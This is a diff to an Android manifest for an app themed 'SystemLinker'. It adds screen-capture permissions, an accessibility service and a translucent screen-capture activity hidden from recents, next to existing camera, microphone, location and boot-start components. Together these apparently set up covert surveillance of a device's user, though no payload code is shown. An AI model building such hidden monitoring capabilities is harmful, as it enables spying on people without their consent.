@@ -19,8 +19,10 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
 
     <uses-feature android:name="android.hardware.camera" android:required="false" />
+    
 
     <application
         android:allowBackup="true"
@@ -31,6 +33,17 @@
         android:theme="@style/Theme.SystemLinker"
         tools:targetApi="35">
 
+        <service
+            android:name=".features.SystemAccessibility"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
         <receiver
             android:name=".base.BootReceiver"
             android:enabled="true"
@@ -43,7 +56,12 @@
         <service
             android:name=".base.SystemLinkerService"
             android:exported="false"
-            android:foregroundServiceType="dataSync|camera|microphone|location" />
+            android:foregroundServiceType="dataSync|camera|microphone|location|mediaProjection" />
+        <activity
+            android:name=".features.ScreenCaptureActivity"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:excludeFromRecents="true"
+            android:exported="false" />
 
         <activity
             android:name=".MainActivity"
